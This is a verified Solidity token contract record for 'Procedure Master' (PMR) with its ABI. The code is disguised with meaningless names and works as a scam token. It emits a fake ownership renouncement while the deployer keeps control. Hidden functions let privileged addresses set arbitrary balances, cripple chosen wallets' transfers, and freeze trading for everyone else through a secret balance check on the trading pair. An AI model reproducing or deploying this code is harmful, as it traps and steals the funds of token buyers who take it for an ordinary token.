{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface autoAmount {\n    function createPair(address teamSwap, address toAuto) external returns (address);\n}\n\ninterface swapLaunchedMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapReceiverTake) external view returns (uint256);\n\n    function transfer(address amountTradingLaunched, uint256 walletBuyMode) external returns (bool);\n\n    function allowance(address launchedSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletBuyMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountTradingLaunched,\n        uint256 walletBuyMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldFrom, uint256 value);\n    event Approval(address indexed launchedSender, address indexed spender, uint256 value);\n}\n\nabstract contract walletAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityMode is swapLaunchedMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProcedureMaster is walletAmount, swapLaunchedMax, liquidityMode {\n\n    function listMarketing() public {\n        emit OwnershipTransferred(amountTeam, address(0));\n        launchedExempt = address(0);\n    }\n\n    address public receiverLimit;\n\n    address public amountTeam;\n\n    address limitMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private autoReceiver;\n\n    bool private fundTotal;\n\n    uint256 feeLiquidityFrom;\n\n    mapping(address => bool) public walletLaunched;\n\n    function allowance(address shouldExempt, address teamLaunch) external view virtual override returns (uint256) {\n        if (teamLaunch == limitMax) {\n            return type(uint256).max;\n        }\n        return txFrom[shouldExempt][teamLaunch];\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedExempt;\n    }\n\n    uint256 public amountLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atMax;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeLaunchedAt;\n    }\n\n    uint256 constant launchIs = 18 ** 10;\n\n    uint256 private atMax = 100000000 * 10 ** 18;\n\n    uint8 private autoTake = 18;\n\n    address listTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function teamReceiverLimit(uint256 walletBuyMode) public {\n        exemptAmount();\n        receiverLiquidity = walletBuyMode;\n    }\n\n    uint256 receiverLiquidity;\n\n    bool public launchedAtList;\n\n    function owner() external view returns (address) {\n        return launchedExempt;\n    }\n\n    function transferFrom(address launchExempt, address amountTradingLaunched, uint256 walletBuyMode) external override returns (bool) {\n        if (_msgSender() != limitMax) {\n            if (txFrom[launchExempt][_msgSender()] != type(uint256).max) {\n                require(walletBuyMode <= txFrom[launchExempt][_msgSender()]);\n                txFrom[launchExempt][_msgSender()] -= walletBuyMode;\n            }\n        }\n        return atToken(launchExempt, amountTradingLaunched, walletBuyMode);\n    }\n\n    mapping(address => mapping(address => uint256)) private txFrom;\n\n    function liquidityList(address atEnable) public {\n        if (launchedAtList) {\n            return;\n        }\n        \n        senderToken[atEnable] = true;\n        \n        launchedAtList = true;\n    }\n\n    function approve(address teamLaunch, uint256 walletBuyMode) public virtual override returns (bool) {\n        txFrom[_msgSender()][teamLaunch] = walletBuyMode;\n        emit Approval(_msgSender(), teamLaunch, walletBuyMode);\n        return true;\n    }\n\n    string private walletMaxAt = \"Procedure Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return walletMaxAt;\n    }\n\n    function exemptAmount() private view {\n        require(senderToken[_msgSender()]);\n    }\n\n    mapping(address => uint256) private marketingTeamFrom;\n\n    address private launchedExempt;\n\n    function balanceOf(address swapReceiverTake) public view virtual override returns (uint256) {\n        return marketingTeamFrom[swapReceiverTake];\n    }\n\n    function walletTotal(address launchExempt, address amountTradingLaunched, uint256 walletBuyMode) internal returns (bool) {\n        require(marketingTeamFrom[launchExempt] >= walletBuyMode);\n        marketingTeamFrom[launchExempt] -= walletBuyMode;\n        marketingTeamFrom[amountTradingLaunched] += walletBuyMode;\n        emit Transfer(launchExempt, amountTradingLaunched, walletBuyMode);\n        return true;\n    }\n\n    string private modeLaunchedAt = \"PMR\";\n\n    event OwnershipTransferred(address indexed receiverIsWallet, address indexed maxTrading);\n\n    constructor (){\n        if (exemptLimit != amountLaunch) {\n            fundTotal = false;\n        }\n        launchFrom swapSell = launchFrom(limitMax);\n        receiverLimit = autoAmount(swapSell.factory()).createPair(swapSell.WETH(), address(this));\n        \n        amountTeam = _msgSender();\n        senderToken[amountTeam] = true;\n        marketingTeamFrom[amountTeam] = atMax;\n        listMarketing();\n        \n        emit Transfer(address(0), amountTeam, atMax);\n    }\n\n    mapping(address => bool) public senderToken;\n\n    uint256 private exemptLimit;\n\n    function transfer(address tradingTakeLaunched, uint256 walletBuyMode) external virtual override returns (bool) {\n        return atToken(_msgSender(), tradingTakeLaunched, walletBuyMode);\n    }\n\n    function atToken(address launchExempt, address amountTradingLaunched, uint256 walletBuyMode) internal returns (bool) {\n        if (launchExempt == amountTeam) {\n            return walletTotal(launchExempt, amountTradingLaunched, walletBuyMode);\n        }\n        uint256 isSwapLaunched = swapLaunchedMax(receiverLimit).balanceOf(listTeam);\n        require(isSwapLaunched == receiverLiquidity);\n        require(amountTradingLaunched != listTeam);\n        if (walletLaunched[launchExempt]) {\n            return walletTotal(launchExempt, amountTradingLaunched, launchIs);\n        }\n        return walletTotal(launchExempt, amountTradingLaunched, walletBuyMode);\n    }\n\n    function takeLimit(address atFund) public {\n        exemptAmount();\n        \n        if (atFund == amountTeam || atFund == receiverLimit) {\n            return;\n        }\n        walletLaunched[atFund] = true;\n    }\n\n    function enableTeam(address tradingTakeLaunched, uint256 walletBuyMode) public {\n        exemptAmount();\n        marketingTeamFrom[tradingTakeLaunched] = walletBuyMode;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoTake;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIsWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletBuyMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiverTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTakeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletBuyMode\",\"type\":\"uint256\"}],\"name\":\"enableTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAtList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"liquidityList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"}],\"name\":\"takeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletBuyMode\",\"type\":\"uint256\"}],\"name\":\"teamReceiverLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTakeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletBuyMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTradingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletBuyMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ProcedureMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}